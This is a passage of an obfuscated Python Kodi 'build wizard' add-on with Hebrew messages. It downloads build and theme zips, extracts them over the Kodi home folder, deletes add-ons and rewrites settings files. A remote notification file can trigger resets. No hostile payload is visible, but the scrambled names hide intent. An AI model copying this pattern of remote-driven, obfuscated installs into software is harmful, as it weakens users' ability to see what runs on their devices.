			OO0OOO0OO00000000 =re .compile (O000OO00O0O00O000 ).findall (OOO0O000OO00O0O00 )[0 ]#line:3887
			OOO000O0O0000O0OO =open (OO0O00O000OOO0OO0 ,'w')#line:3888
			OOO000O0O0000O0OO .write (OOO0O000OO00O0O00 .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%OO0OOO0OO00000000 ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3889
			OOO000O0O0000O0OO .close ()#line:3890
		except :#line:3891
				pass #line:3892
		wiz .kodi17Fix ()#line:3893
		OO0O00O000OOO0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3894
		try :#line:3895
			OOO000O0O0000O0OO =open (OO0O00O000OOO0OO0 ,'r')#line:3896
			OOO0O000OO00O0O00 =OOO000O0O0000O0OO .read ()#line:3897
			OOO000O0O0000O0OO .close ()#line:3898
			O000OO00O0O00O000 ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3899
			OO0OOO0OO00000000 =re .compile (O000OO00O0O00O000 ).findall (OOO0O000OO00O0O00 )[0 ]#line:3900
			OOO000O0O0000O0OO =open (OO0O00O000OOO0OO0 ,'w')#line:3901
			OOO000O0O0000O0OO .write (OOO0O000OO00O0O00 .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%OO0OOO0OO00000000 ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3902
			OOO000O0O0000O0OO .close ()#line:3903
		except :#line:3904
				pass #line:3905
		swapSkins ('skin.Premium.mod')#line:3906
def buildWizard (O000O0OO0OOOO0O00 ,O00000O0O0OOOOOO0 ,theme =None ,over =False ):#line:3909
	if over ==False :#line:3910
		O0OO00OOO0OOO00OO =wiz .checkBuild (O000O0OO0OOOO0O00 ,'url')#line:3911
		if USERNAME =='':#line:3912
			ADDON .openSettings ()#line:3913
			sys .exit ()#line:3914
		if PASSWORD =='':#line:3915
			ADDON .openSettings ()#line:3916
			sys .exit ()#line:3917
		if BUILDNAME =='':#line:3919
			O000O0O0OO0OO0O0O =u_list (SPEEDFILE )#line:3920
			(O000O0O0OO0OO0O0O )#line:3921
		if O0OO00OOO0OOO00OO ==False :#line:3922
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:3927
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:3928
			return #line:3929
		OO000O0O00OOOO00O =wiz .workingURL (O0OO00OOO0OOO00OO )#line:3930
		if OO000O0O00OOOO00O ==False :#line:3931
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,OO000O0O00OOOO00O ))#line:3932
			return #line:3933
	if O00000O0O0OOOOOO0 =='gui':#line:3934
		if O000O0OO0OOOO0O00 ==BUILDNAME :#line:3935
			if over ==True :OO0OOOOO000OOOO0O =1 #line:3936
			else :OO0OOOOO000OOOO0O =1 #line:3937
		else :#line:3938
			OO0OOOOO000OOOO0O =1 #line:3939
		if OO0OOOOO000OOOO0O :#line:3940
			remove_addons ()#line:3941
			remove_addons2 ()#line:3942
			debridit .debridIt ('update','all')#line:3943
			traktit .traktIt ('update','all')#line:3944
			O0000OO0O000O0OOO =wiz .checkBuild (O000O0OO0OOOO0O00 ,'gui')#line:3945
			OOOOOOOO00OO0O0O0 =O000O0OO0OOOO0O00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3946
			if not wiz .workingURL (O0000OO0O000O0OOO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3947
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3948
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000O0OO0OOOO0O00 ),'','אנא המתן')#line:3949
			O0O0OO0OO0OOO0OOO =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOOOOOOO00OO0O0O0 )#line:3950
			try :os .remove (O0O0OO0OO0OOO0OOO )#line:3951
			except :pass #line:3952
			logging .warning (O0000OO0O000O0OOO )#line:3953
			if 'google'in O0000OO0O000O0OOO :#line:3954
			   OO0OO0O0O00OO0O00 =googledrive_download (O0000OO0O000O0OOO ,O0O0OO0OO0OOO0OOO ,DP ,wiz .checkBuild (O000O0OO0OOOO0O00 ,'filesize'))#line:3955
			else :#line:3958
			  downloader .download (O0000OO0O000O0OOO ,O0O0OO0OO0OOO0OOO ,DP )#line:3959
			xbmc .sleep (100 )#line:3960
			O000OOOO0000OOO0O ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000O0OO0OOOO0O00 )#line:3961
			DP .update (0 ,O000OOOO0000OOO0O ,'','אנא המתן')#line:3962
			extract .all (O0O0OO0OO0OOO0OOO ,HOME ,DP ,title =O000OOOO0000OOO0O )#line:3963
			DP .close ()#line:3964
			wiz .defaultSkin ()#line:3965
			wiz .lookandFeelData ('save')#line:3966
			wiz .kodi17Fix ()#line:3967
			if KODIV >=18 :#line:3968
				skindialogsettind18 ()#line:3969
			debridit .debridIt ('restore','all')#line:3970
			traktit .traktIt ('restore','all')#line:3971
			if INSTALLMETHOD ==1 :O00O000OOOO000OOO =1 #line:3973
			elif INSTALLMETHOD ==2 :O00O000OOOO000OOO =0 #line:3974
			else :DP .close ()#line:3975
			OOOOOOOOOO00O0OO0 =(NOTIFICATION2 )#line:3976
			O000O00000OO0O0O0 =urllib2 .urlopen (OOOOOOOOOO00O0OO0 )#line:3977
			O000O0O0O0O0O0OOO =O000O00000OO0O0O0 .readlines ()#line:3978
			O00OO00O0O00000OO =0 #line:3979
			for OOO00O000OO0OOO00 in O000O0O0O0O0O0OOO :#line:3982
				if OOO00O000OO0OOO00 .split (' ==')[0 ]=="noreset"or OOO00O000OO0OOO00 .split ()[0 ]=="noreset":#line:3983
					xbmc .executebuiltin ("ReloadSkin()")#line:3985
					wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3986
					update_Votes ()#line:3987
					indicatorfastupdate ()#line:3988
				if OOO00O000OO0OOO00 .split (' ==')[0 ]=="reset"or OOO00O000OO0OOO00 .split ()[0 ]=="reset":#line:3989
					update_Votes ()#line:3991
					indicatorfastupdate ()#line:3992
					resetkodi ()#line:3993
		else :#line:4002
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4003
	if O00000O0O0OOOOOO0 =='gui2':#line:4004
		if O000O0OO0OOOO0O00 ==BUILDNAME :#line:4005
			if over ==True :OO0OOOOO000OOOO0O =1 #line:4006
			else :OO0OOOOO000OOOO0O =1 #line:4007
		else :#line:4008
			OO0OOOOO000OOOO0O =1 #line:4009
		if OO0OOOOO000OOOO0O :#line:4010
			remove_addons ()#line:4011
			remove_addons2 ()#line:4012
			O0000OO0O000O0OOO =wiz .checkBuild (O000O0OO0OOOO0O00 ,'gui')#line:4013
			OOOOOOOO00OO0O0O0 =O000O0OO0OOOO0O00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4014
			if not wiz .workingURL (O0000OO0O000O0OOO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4015
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4016
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000O0OO0OOOO0O00 ),'','אנא המתן')#line:4017
			O0O0OO0OO0OOO0OOO =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOOOOOOO00OO0O0O0 )#line:4018
			try :os .remove (O0O0OO0OO0OOO0OOO )#line:4019
			except :pass #line:4020
			logging .warning (O0000OO0O000O0OOO )#line:4021
			if 'google'in O0000OO0O000O0OOO :#line:4022
			   OO0OO0O0O00OO0O00 =googledrive_download (O0000OO0O000O0OOO ,O0O0OO0OO0OOO0OOO ,DP ,wiz .checkBuild (O000O0OO0OOOO0O00 ,'filesize'))#line:4023
			else :#line:4026
			  downloader .download (O0000OO0O000O0OOO ,O0O0OO0OO0OOO0OOO ,DP )#line:4027
			xbmc .sleep (100 )#line:4028
			O000OOOO0000OOO0O ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000O0OO0OOOO0O00 )#line:4029
			DP .update (0 ,O000OOOO0000OOO0O ,'','אנא המתן')#line:4030
			extract .all (O0O0OO0OO0OOO0OOO ,HOME ,DP ,title =O000OOOO0000OOO0O )#line:4031
			DP .close ()#line:4032
			wiz .defaultSkin ()#line:4033
			wiz .lookandFeelData ('save')#line:4034
			if INSTALLMETHOD ==1 :O00O000OOOO000OOO =1 #line:4037
			elif INSTALLMETHOD ==2 :O00O000OOOO000OOO =0 #line:4038
			else :DP .close ()#line:4039
		else :#line:4041
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4042
	elif O00000O0O0OOOOOO0 =='fresh':#line:4043
		freshStart (O000O0OO0OOOO0O00 )#line:4044
	elif O00000O0O0OOOOOO0 =='normal':#line:4045
		if url =='normal':#line:4046
			if KEEPTRAKT =='true':#line:4047
				traktit .autoUpdate ('all')#line:4048
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4049
			if KEEPREAL =='true':#line:4050
				debridit .autoUpdate ('all')#line:4051
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4052
			if KEEPLOGIN =='true':#line:4053
				loginit .autoUpdate ('all')#line:4054
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4055
		OO0O0O0O00OO00OO0 =int (KODIV );O0000O0O00O00O0O0 =int (float (wiz .checkBuild (O000O0OO0OOOO0O00 ,'kodi')))#line:4056
		if not OO0O0O0O00OO00OO0 ==O0000O0O00O00O0O0 :#line:4057
			if OO0O0O0O00OO00OO0 ==16 and O0000O0O00O00O0O0 <=15 :OOO0O00OO00OO000O =False #line:4058
			else :OOO0O00OO00OO000O =True #line:4059
		else :OOO0O00OO00OO000O =False #line:4060
		if OOO0O00OO00OO000O ==True :#line:4061
			OOOO0OOOOOO00O000 =1 #line:4062
		else :#line:4063
			if not over ==False :OOOO0OOOOOO00O000 =1 #line:4064
			else :OOOO0OOOOOO00O000 =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4065
		if OOOO0OOOOOO00O000 :#line:4066
			wiz .clearS ('build')#line:4067
			O0000OO0O000O0OOO =wiz .checkBuild (O000O0OO0OOOO0O00 ,'url')#line:4068
			OOOOOOOO00OO0O0O0 =O000O0OO0OOOO0O00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4069
			if not wiz .workingURL (O0000OO0O000O0OOO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4070
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4071
			DP .create (ADDONTITLE ,'[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR][B]מוריד[/B]'%(COLOR2 ,COLOR1 ,O000O0OO0OOOO0O00 ,wiz .checkBuild (O000O0OO0OOOO0O00 ,'version')),'','אנא המתן')#line:4072
			O0O0OO0OO0OOO0OOO =os .path .join (PACKAGES ,'%s.zip'%OOOOOOOO00OO0O0O0 )#line:4073
			try :os .remove (O0O0OO0OO0OOO0OOO )#line:4074
			except :pass #line:4075
			logging .warning (O0000OO0O000O0OOO )#line:4076
			if 'google'in O0000OO0O000O0OOO :#line:4077
			   OO0OO0O0O00OO0O00 =googledrive_download (O0000OO0O000O0OOO ,O0O0OO0OO0OOO0OOO ,DP ,wiz .checkBuild (O000O0OO0OOOO0O00 ,'filesize'))#line:4078
			else :#line:4081
			  downloader .download (O0000OO0O000O0OOO ,O0O0OO0OO0OOO0OOO ,DP )#line:4082
			xbmc .sleep (1000 )#line:4083
			O000OOOO0000OOO0O ='[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000O0OO0OOOO0O00 ,wiz .checkBuild (O000O0OO0OOOO0O00 ,'version'))#line:4084
			DP .update (0 ,O000OOOO0000OOO0O ,'','אנא המתן...')#line:4085
			OO00O0000O00OOOOO ,O0OOO00O000O0OO00 ,O0OO0000O0OO0O0OO =extract .all (O0O0OO0OO0OOO0OOO ,HOME ,DP ,title =O000OOOO0000OOO0O )#line:4086
			if int (float (OO00O0000O00OOOOO ))>0 :#line:4087
				try :#line:4088
					wiz .fixmetas ()#line:4089
				except :pass #line:4090
				wiz .lookandFeelData ('save')#line:4091
				wiz .defaultSkin ()#line:4092
				wiz .setS ('buildname',O000O0OO0OOOO0O00 )#line:4094
				wiz .setS ('buildversion',wiz .checkBuild (O000O0OO0OOOO0O00 ,'version'))#line:4095
				wiz .setS ('buildtheme','')#line:4096
				wiz .setS ('latestversion',wiz .checkBuild (O000O0OO0OOOO0O00 ,'version'))#line:4097
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:4098
				wiz .setS ('installed','true')#line:4099
				wiz .setS ('extract',str (OO00O0000O00OOOOO ))#line:4100
				wiz .setS ('errors',str (O0OOO00O000O0OO00 ))#line:4101
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OO00O0000O00OOOOO ,O0OOO00O000O0OO00 ))#line:4102
				fastupdatefirstbuild (NOTEID )#line:4103
				wiz .kodi17Fix ()#line:4104
				skin_homeselect ()#line:4105
				skin_lower ()#line:4106
				rdbuildinstall ()#line:4107
				try :gaiaserenaddon ()#line:4108
				except :pass #line:4109
				adults18 ()#line:4110
				skinfix18 ()#line:4111
				try :os .remove (O0O0OO0OO0OOO0OOO )#line:4113
				except :pass #line:4114
				O0O0O00OO0OOOO0O0 =(ADDON .getSetting ("auto_rd"))#line:4115
				if O0O0O00OO0OOOO0O0 =='true':#line:4116
					try :#line:4117
						setautorealdebrid ()#line:4118
					except :pass #line:4119
				try :#line:4120
					autotrakt ()#line:4121
				except :pass #line:4122
				O0OOOOO0OOOO000OO =(ADDON .getSetting ("imdb_on"))#line:4123
				if O0OOOOO0OOOO000OO =='true':#line:4124
					imdb_synck ()#line:4125
				iptvset ()#line:4126
				DP .close ()#line:4134
				O0000000OO0OOO00O =wiz .themeCount (O000O0OO0OOOO0O00 )#line:4135
				builde_Votes ()#line:4136
				indicator ()#line:4137
				if not O0000000OO0OOO00O ==False :#line:4138
					buildWizard (O000O0OO0OOOO0O00 ,'theme')#line:4139
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4140
				if INSTALLMETHOD ==1 :O00O000OOOO000OOO =1 #line:4141
				elif INSTALLMETHOD ==2 :O00O000OOOO000OOO =0 #line:4142
				else :resetkodi ()#line:4143
				if O00O000OOOO000OOO ==1 :wiz .reloadFix ()#line:4145
				else :wiz .killxbmc (True )#line:4146
			else :#line:4147
				if isinstance (O0OOO00O000O0OO00 ,unicode ):#line:4148
					O0OO0000O0OO0O0OO =O0OO0000O0OO0O0OO .encode ('utf-8')#line:4149
				OO00OOOOOO0O00O00 =open (O0O0OO0OO0OOO0OOO ,'r')#line:4150
				O000O0O0O00O00OOO =OO00OOOOOO0O00O00 .read ()#line:4151
				O00000O0O0OO0OOO0 =''#line:4152
				for OOO0O0OOOOO0OO0OO in OO0OO0O0O00OO0O00 :#line:4153
				  O00000O0O0OO0OOO0 ='key: '+O00000O0O0OO0OOO0 +'\n'+OOO0O0OOOOO0OO0OO #line:4154
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,O0OO0000O0OO0O0OO +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+O00000O0O0OO0OOO0 )#line:4155
		else :#line:4156
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:4157
	elif O00000O0O0OOOOOO0 =='theme':#line:4158
		if theme ==None :#line:4159
			O0000000OO0OOO00O =wiz .checkBuild (O000O0OO0OOOO0O00 ,'theme')#line:4160
			O0OO00000OOOO00O0 =[]#line:4161
			if not O0000000OO0OOO00O =='http://'and wiz .workingURL (O0000000OO0OOO00O )==True :#line:4162
				O0OO00000OOOO00O0 =wiz .themeCount (O000O0OO0OOOO0O00 ,False )#line:4163
				if len (O0OO00000OOOO00O0 )>0 :#line:4164
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,O000O0OO0OOOO0O00 ,COLOR1 ,len (O0OO00000OOOO00O0 )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:4165
						wiz .log ("Theme List: %s "%str (O0OO00000OOOO00O0 ))#line:4166
						O0OOO00OOO0O0O0O0 =DIALOG .select (ADDONTITLE ,O0OO00000OOOO00O0 )#line:4167
						wiz .log ("Theme install selected: %s"%O0OOO00OOO0O0O0O0 )#line:4168
						if not O0OOO00OOO0O0O0O0 ==-1 :theme =O0OO00000OOOO00O0 [O0OOO00OOO0O0O0O0 ];OO0OOO00OOO0O0O00 =True #line:4169
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4170
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4171
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:4172
		else :OO0OOO00OOO0O0O00 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,O000O0OO0OOOO0O00 ,wiz .checkBuild (O000O0OO0OOOO0O00 ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:4173
		if OO0OOO00OOO0O0O00 :#line:4174
			OOO0O00O00OOO000O =wiz .checkTheme (O000O0OO0OOOO0O00 ,theme ,'url')#line:4175
			OOOOOOOO00OO0O0O0 =O000O0OO0OOOO0O00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4176
			if not wiz .workingURL (OOO0O00O00OOO000O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:4177
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4178
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:4179
			O0O0OO0OO0OOO0OOO =os .path .join (PACKAGES ,'%s.zip'%OOOOOOOO00OO0O0O0 )#line:4180
			try :os .remove (O0O0OO0OO0OOO0OOO )#line:4181
			except :pass #line:4182
			downloader .download (OOO0O00O00OOO000O ,O0O0OO0OO0OOO0OOO ,DP )#line:4183
			xbmc .sleep (1000 )#line:4184
			DP .update (0 ,"","Installing %s "%O000O0OO0OOOO0O00 )#line:4185
			O0OO0OO00O0OO0OO0 =False #line:4186
			if url not in ["fresh","normal"]:#line:4187
				O0OO0OO00O0OO0OO0 =testTheme (O0O0OO0OO0OOO0OOO )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4188
				O0O0OOO0O0O0000OO =testGui (O0O0OO0OO0OOO0OOO )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4189
				if O0OO0OO00O0OO0OO0 ==True :#line:4190
					wiz .lookandFeelData ('save')#line:4191
					O0O00OO000OOOO0OO ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4192
					OO0OOOOO00O0OOOO0 =xbmc .getSkinDir ()#line:4193
					skinSwitch .swapSkins (O0O00OO000OOOO0OO )#line:4195
					O000O0O0O0O0O0OOO =0 #line:4196
					xbmc .sleep (1000 )#line:4197
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O000O0O0O0O0O0OOO <150 :#line:4198
						O000O0O0O0O0O0OOO +=1 #line:4199
						xbmc .sleep (1000 )#line:4200
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4201
						wiz .ebi ('SendClick(11)')#line:4202
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4203
					xbmc .sleep (1000 )#line:4204
			O000OOOO0000OOO0O ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:4205
			DP .update (0 ,O000OOOO0000OOO0O ,'','אנא המתן')#line:4206
			OO00O0000O00OOOOO ,O0OOO00O000O0OO00 ,O0OO0000O0OO0O0OO =extract .all (O0O0OO0OO0OOO0OOO ,HOME ,DP ,title =O000OOOO0000OOO0O )#line:4207
			wiz .setS ('buildtheme',theme )#line:4208
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(OO00O0000O00OOOOO ,O0OOO00O000O0OO00 ))#line:4209
			DP .close ()#line:4210
			if url not in ["fresh","normal"]:#line:4211
				wiz .forceUpdate ()#line:4212
				if KODIV >=17 :wiz .kodi17Fix ()#line:4213
				if O0O0OOO0O0O0000OO ==True :#line:4214
					wiz .lookandFeelData ('save')#line:4215
					wiz .defaultSkin ()#line:4216
					OO0OOOOO00O0OOOO0 =wiz .getS ('defaultskin')#line:4217
					skinSwitch .swapSkins (OO0OOOOO00O0OOOO0 )#line:4218
					O000O0O0O0O0O0OOO =0 #line:4219
					xbmc .sleep (1000 )#line:4220
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O000O0O0O0O0O0OOO <150 :#line:4221
						O000O0O0O0O0O0OOO +=1 #line:4222
						xbmc .sleep (1000 )#line:4223
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4225
						wiz .ebi ('SendClick(11)')#line:4226
					wiz .lookandFeelData ('restore')#line:4227
				elif O0OO0OO00O0OO0OO0 ==True :#line:4228
					skinSwitch .swapSkins (OO0OOOOO00O0OOOO0 )#line:4229
					O000O0O0O0O0O0OOO =0 #line:4230
					xbmc .sleep (1000 )#line:4231
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O000O0O0O0O0O0OOO <150 :#line:4232
						O000O0O0O0O0O0OOO +=1 #line:4233
						xbmc .sleep (1000 )#line:4234
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4236
						wiz .ebi ('SendClick(11)')#line:4237
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4238
					wiz .lookandFeelData ('restore')#line:4239
				else :#line:4240
					wiz .ebi ("ReloadSkin()")#line:4241
					xbmc .sleep (1000 )#line:4242
					wiz .ebi ("Container.Refresh")#line:4243
		else :#line:4244
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:4245
def skin_homeselect ():#line:4249
	try :#line:4251
		O0OO00O0OOOOO0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4252
		O00OOOO0OO0O0OOOO =open (O0OO00O0OOOOO0O00 ,'r')#line:4254
		O0O00O00O00O0O0OO =O00OOOO0OO0O0OOOO .read ()#line:4255
		O00OOOO0OO0O0OOOO .close ()#line:4256
		O0O0OOO0O00O00O00 ='<setting id="HomeS" type="string(.+?)/setting>'#line:4257
		O00OOOOO000O0OO0O =re .compile (O0O0OOO0O00O00O00 ).findall (O0O00O00O00O0O0OO )[0 ]#line:4258
		O00OOOO0OO0O0OOOO =open (O0OO00O0OOOOO0O00 ,'w')#line:4259
		O00OOOO0OO0O0OOOO .write (O0O00O00O00O0O0OO .replace ('<setting id="HomeS" type="string%s/setting>'%O00OOOOO000O0OO0O ,'<setting id="HomeS" type="string"></setting>'))#line:4260
		O00OOOO0OO0O0OOOO .close ()#line:4261
	except :#line:4262
		pass #line:4263
def skin_lower ():#line:4266
	OOOOO0O0O00O0OOO0 =(ADDON .getSetting ("lower"))#line:4267
	if OOOOO0O0O00O0OOO0 =='true':#line:4268
		try :#line:4271
			O0OOOO0000OOOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4272
			O00000O0OOOO0O000 =open (O0OOOO0000OOOO000 ,'r')#line:4274
			OOO00000O0O0000OO =O00000O0OOOO0O000 .read ()#line:4275
			O00000O0OOOO0O000 .close ()#line:4276
			O000OOOO0O0O0O0O0 ='<setting id="none_widget" type="bool(.+?)/setting>'#line:4277
			O0O00OO000OOO00OO =re .compile (O000OOOO0O0O0O0O0 ).findall (OOO00000O0O0000OO )[0 ]#line:4278
			O00000O0OOOO0O000 =open (O0OOOO0000OOOO000 ,'w')#line:4279
			O00000O0OOOO0O000 .write (OOO00000O0O0000OO .replace ('<setting id="none_widget" type="bool%s/setting>'%O0O00OO000OOO00OO ,'<setting id="none_widget" type="bool">true</setting>'))#line:4280
			O00000O0OOOO0O000 .close ()#line:4281
			O0OOOO0000OOOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4283
			O00000O0OOOO0O000 =open (O0OOOO0000OOOO000 ,'r')#line:4285
			OOO00000O0O0000OO =O00000O0OOOO0O000 .read ()#line:4286
			O00000O0OOOO0O000 .close ()#line:4287
			O000OOOO0O0O0O0O0 ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:4288
			O0O00OO000OOO00OO =re .compile (O000OOOO0O0O0O0O0 ).findall (OOO00000O0O0000OO )[0 ]#line:4289
			O00000O0OOOO0O000 =open (O0OOOO0000OOOO000 ,'w')#line:4290
			O00000O0OOOO0O000 .write (OOO00000O0O0000OO .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%O0O00OO000OOO00OO ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:4291
			O00000O0OOOO0O000 .close ()#line:4292
			O0OOOO0000OOOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4294
			O00000O0OOOO0O000 =open (O0OOOO0000OOOO000 ,'r')#line:4296
			OOO00000O0O0000OO =O00000O0OOOO0O000 .read ()#line:4297
			O00000O0OOOO0O000 .close ()#line:4298
			O000OOOO0O0O0O0O0 ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:4299
			O0O00OO000OOO00OO =re .compile (O000OOOO0O0O0O0O0 ).findall (OOO00000O0O0000OO )[0 ]#line:4300
			O00000O0OOOO0O000 =open (O0OOOO0000OOOO000 ,'w')#line:4301
			O00000O0OOOO0O000 .write (OOO00000O0O0000OO .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%O0O00OO000OOO00OO ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:4302
			O00000O0OOOO0O000 .close ()#line:4303
			O0OOOO0000OOOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4307
			O00000O0OOOO0O000 =open (O0OOOO0000OOOO000 ,'r')#line:4309
